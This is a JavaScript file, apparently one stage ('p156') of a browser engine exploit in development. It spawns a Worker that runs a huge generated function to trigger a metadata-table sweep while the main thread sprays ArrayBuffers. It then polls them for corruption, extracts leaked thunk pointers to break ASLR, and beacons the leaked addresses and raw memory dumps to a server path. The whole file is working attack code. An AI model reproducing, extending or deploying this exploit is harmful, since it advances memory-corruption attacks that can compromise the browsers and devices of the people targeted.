// p156 — Worker-triggered MetadataTable sweep, main thread polls spray
//
// finishCreation runs on FIRST CALL (lazy CodeBlock). Calling on main thread
// blocks it during 4.3GB sweep → can't poll. Worker runs sweep on separate
// thread. Main thread polls spray via MessageChannel for fast detection.
// Spray corruption happens in first ~1s. Crash at ~38s. Plenty of time.
//
// Beacon prefix: V156-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V156-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V156-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch (e) {}
  }

  BS('BOOT');

  // Phase 1: Build Worker blob with 38M function + immediate call
  var N = 38348816;
  var CHUNK = 4000000;
  var chunksN = Math.floor(N / CHUNK);
  var rem = N - chunksN * CHUNK;
  var callChunk = 'a();'.repeat(CHUNK);

  var parts = new Array(chunksN + 3);
  parts[0] = 'var fn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};postMessage("ready");try{fn(function(){throw 1});}catch(e){}postMessage("done");';
  callChunk = null;

  var blob = new Blob(parts, { type: 'application/javascript' });
  BS('WBLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  // Phase 2: Spray on main thread BEFORE Worker starts call
  var BUF_SZ = 100112;
  var SPRAY_COUNT = 600;
  var bufs = [];
  var views = [];
  for (var i = 0; i < SPRAY_COUNT; i++) {
    bufs.push(new ArrayBuffer(BUF_SZ));
    views.push(new Uint8Array(bufs[i]));
  }
  BS('SPRAY-' + SPRAY_COUNT + '-SZ' + BUF_SZ);

  // Phase 3: Launch Worker — it parses (~6s), then calls function → sweep
  var wurl = URL.createObjectURL(blob);
  var w = new Worker(wurl);
  var workerState = '';

  w.onmessage = function(e) {
    workerState = e.data;
    BS('WMSG-' + e.data);
  };
  w.onerror = function() {
    BS('WERR');
  };

  BS('WORKER-LAUNCHED');

  // Phase 4: Poll spray via MessageChannel (sub-ms resolution)
  var found = false;
  var polls = 0;
  var mc = new MessageChannel();

  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  mc.port1.onmessage = function() {
    if (found) return;
    polls++;

    // Scan every ~20th buffer per poll for speed, rotate which ones
    var startBuf = (polls * 7) % SPRAY_COUNT;
    var checked = 0;

    for (var step = 0; step < SPRAY_COUNT && !found; step++) {
      var idx = (startBuf + step) % SPRAY_COUNT;
      var v = views[idx];

      // Check at stride 112: offset 12 is m_slowPathCount = 0xFFFFFFFF
      for (var off = 12; off < v.length && !found; off += 112) {
        if (v[off] === 0xFF && v[off + 1] === 0xFF && v[off + 2] === 0xFF && v[off + 3] === 0xFF) {
          found = true;
          BS('HIT-B' + idx + '-O' + off + '-P' + polls);

          // Read thunk pointer at entry+24 (the ASLR leak)
          var entryBase = off - 12;
          var ptrOff = entryBase + 24;
          if (ptrOff + 8 <= v.length) {
            var hex = '';
            for (var h = 7; h >= 0; h--) hex += hexByte(v[ptrOff + h]);
            BS('THUNK=' + hex);
          }

          // Read bytecodeIndex at entry+68 to verify it's a real metadata entry
          var idxOff = entryBase + 68;
          if (idxOff + 4 <= v.length) {
            var bci = (v[idxOff] | (v[idxOff+1] << 8) | (v[idxOff+2] << 16) | ((v[idxOff+3] << 24) >>> 0)) >>> 0;
            BS('BCI=' + bci);
          }

          // Dump more thunk pointers from same and nearby buffers
          var ptrs = 0;
          for (var j = idx; j < views.length && ptrs < 20; j++) {
            var vj = views[j];
            for (var eo = 12; eo + 100 <= vj.length && ptrs < 20; eo += 112) {
              if (vj[eo] === 0xFF && vj[eo+1] === 0xFF && vj[eo+2] === 0xFF && vj[eo+3] === 0xFF) {
                var po = eo - 12 + 24;
                if (po + 8 <= vj.length) {
                  var hx = '';
                  for (var h = 7; h >= 0; h--) hx += hexByte(vj[po + h]);
                  B('PTR-B' + j + '-E' + Math.round(eo / 112) + '=' + hx);
                  ptrs++;
                }
              }
            }
          }

          // Raw dump first corrupted region
          var raw = '';
          var rc = 0;
          for (var ro = entryBase; ro + 8 <= v.length && rc < 14; ro += 8) {
            var any = false;
            for (var rb = 0; rb < 8; rb++) { if (v[ro + rb] !== 0) { any = true; break; } }
            if (any) {
              var rh = '';
              for (var h = 7; h >= 0; h--) rh += hexByte(v[ro + h]);
              raw += (ro - entryBase) + ':' + rh + ' ';
              rc++;
            }
          }
          if (rc > 0) B('RAW=' + raw.trim());

          BS('ASLR-LEAK-' + ptrs + 'ptrs');
          return;
        }
      }
      checked++;
      if (checked >= 30) break; // limit per poll iteration for responsiveness
    }

    // Continue polling
    if (polls < 50000) {
      mc.port2.postMessage(0);
    } else {
      BS('TIMEOUT-' + polls);
    }
  };

  // Start polling
  mc.port2.postMessage(0);
})();
